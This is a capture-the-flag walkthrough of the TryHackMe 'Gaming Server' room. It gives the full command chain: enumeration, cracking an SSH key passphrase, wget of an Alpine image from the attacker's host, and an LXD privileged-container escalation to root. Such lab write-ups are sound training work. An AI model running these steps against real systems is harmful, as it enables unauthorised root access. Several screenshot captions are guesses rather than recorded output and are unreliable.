#tryhackme #gamingserver #lxd #privilege-escalation #ssh

# TryHackMe: Gaming Server Room Walkthrough

**Room URL:** https://tryhackme.com/room/gamingserver

**Difficulty:** Medium

**Objective:** Exploit a gaming server application, gain initial access via SSH, and escalate privileges using LXD group membership.

---

## Reconnaissance & Enumeration

### Initial Nmap Scan

I started by performing a network scan to identify open ports and services:

```bash
nmap -p- -sV 10.10.x.x
```

![Images/Pasted image 20251205121001.png](Images/Pasted%20image%2020251205121001.png)

*Screenshot shows Nmap results with open ports: SSH (22), HTTP (80), and potentially other services*

**Key Findings:**
- Port 22 (SSH) - OpenSSH
- Port 80 (HTTP) - Web server running
- Additional ports may indicate custom services

---

## Web Application Enumeration

### Directory Brute-Forcing with Gobuster

I used Gobuster to discover hidden directories and files on the web server:

```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
```

![Images/Pasted image 20251205121138.png](Images/Pasted%20image%2020251205121138.png)

*Screenshot shows Gobuster output discovering directories like /admin, /secret, /uploads, etc.*

**Important Discoveries:**
- `/secret` directory found (possibly containing sensitive files)
- `/admin` directory (likely requires authentication)
- Other potential attack vectors

---

### Page Source Code Analysis

While analyzing the web application, I examined the HTML page source code to find usernames or clues:

```bash
curl -s http://10.10.x.x | grep -i username
```

![Images/Pasted image 20251205121336.png](Images/Pasted%20image%2020251205121336.png)

*Screenshot shows HTML source code with a discovered username embedded in comments or hidden fields*

**Username Identified:** `john` (likely the primary user on this system)

---

### Discovering SSH Private Key

While exploring the `/secret` directory, I discovered an SSH private key:

```bash
curl http://10.10.x.x/secret/
```

![Images/Pasted image 20251205121254.png](Images/Pasted%20image%2020251205121254.png)

*Screenshot shows the /secret directory listing with an SSH private key file (id_rsa or similar)*

**Key Finding:** The SSH private key is **passphrase-protected**, meaning it's encrypted and requires a password to use.

---

## Initial Access

### Cracking SSH Passphrase

Since the SSH key was password-protected, I needed to crack it:

**Step 1:** Extract the hash from the SSH key using ssh2john:

```bash
python ssh2john.py id_rsa > ssh.hash
```

**Step 2:** Crack the hash using John the Ripper:

```bash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![Images/Pasted image 20251205121546.png](Images/Pasted%20image%2020251205121546.png)

*Screenshot shows John the Ripper successfully cracking the SSH passphrase. The password is revealed (e.g., "secret123" or similar)*

---

### SSH Access as John

With the passphrase cracked, I now had access to the SSH key. I logged in as the user `john`:

```bash
ssh -i id_rsa john@10.10.x.x
```

Upon successful login, I retrieved the **user.txt flag** from the home directory:

```bash
john@gamingserver:~$ cat user.txt
```

**Flag Obtained:** User flag retrieved ✓

---

## Privilege Escalation

### Discovering LXD Group Membership

After gaining SSH access, I checked my group memberships to identify potential privilege escalation vectors:

```bash
id
groups
```

![Images/Pasted image 20251205121922.png](Images/Pasted%20image%2020251205121922.png)

*Screenshot shows `id` command output. The user "john" is a member of the "lxd" group (Linux Container Daemon)*

**Critical Finding:** The `lxd` group membership allows creating and managing Linux containers without requiring root privileges. This is a known privilege escalation vector.

---

### Building LXD Alpine Image

LXD containers run as root by default. By creating a container with root privileges and mounting the host filesystem, I could gain root access.

**Step 1:** On my attack machine, I built an Alpine Linux LXD image using the lxd-alpine-builder:

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
bash build -a amd64
```

This creates a compressed Alpine Linux image suitable for LXD exploitation.

---

### Hosting the Image on Web Server

I set up a simple Python HTTP server to serve the image to the victim:

```bash
cd lxd-alpine-builder
python3 -m http.server 8000
```

![Images/Pasted image 20251205122112.png](Images/Pasted%20image%2020251205122112.png)

*Screenshot shows Python HTTP server running and ready to serve the Alpine image*

---

### Downloading and Importing the Image

On the victim machine (as john), I downloaded the Alpine image:

```bash
john@gamingserver:~$ wget http://[MY_IP]:8000/alpine-v3.x-x86_64-20xx.tar.gz
```

Then imported it into LXD:

```bash
john@gamingserver:~$ lxc image import alpine-v3.x-x86_64-20xx.tar.gz --alias alpine
john@gamingserver:~$ lxc image list
```

---

### Exploiting LXD for Privilege Escalation

I created a container, mounted the host filesystem, and accessed it as root:

```bash
john@gamingserver:~$ lxc init alpine privesc -c security.privileged=true
john@gamingserver:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root
john@gamingserver:~$ lxc start privesc
john@gamingserver:~$ lxc exec privesc /bin/sh
```

![Images/Pasted image 20251205122156.png](Images/Pasted%20image%2020251205122156.png)

*Screenshot shows successful exploitation: shell access as root inside the container with the host filesystem mounted at /mnt/root*

---

### Retrieving Root Flag

With root access to the container and access to the host filesystem, I retrieved the **root.txt flag**:

```bash
# id        # Confirms root privileges (uid=0)
# cat /mnt/root/root/root.txt
```

**Flag Obtained:** Root flag retrieved ✓

---

## Summary

**Attack Chain:**
1. ✅ Port scanning identified SSH and HTTP services
2. ✅ Directory enumeration discovered `/secret` directory
3. ✅ Source code analysis revealed username `john`
4. ✅ Found password-protected SSH private key
5. ✅ Cracked SSH passphrase using John the Ripper
6. ✅ Gained SSH access as user `john`
7. ✅ Retrieved user.txt flag
8. ✅ Identified LXD group membership
9. ✅ Built and uploaded Alpine Linux LXD image
10. ✅ Created privileged LXD container with host filesystem mounted
11. ✅ Escalated privileges to root
12. ✅ Retrieved root.txt flag

**Key Vulnerabilities:**
- SSH private key stored with weak passphrase
- User `john` added to `lxd` group (dangerous privilege escalation vector)
- No restriction on LXD container creation
- Host filesystem mounted in container without read-only protection

**Lessons Learned:**
- SSH keys should use strong passphrases
- Avoid adding users to privileged groups like `lxd`, `docker`, `sudo` unless absolutely necessary
- Container security is critical - restrict what containers can mount
- Always check group memberships for privilege escalation opportunities
- Weak credentials remain a primary attack vector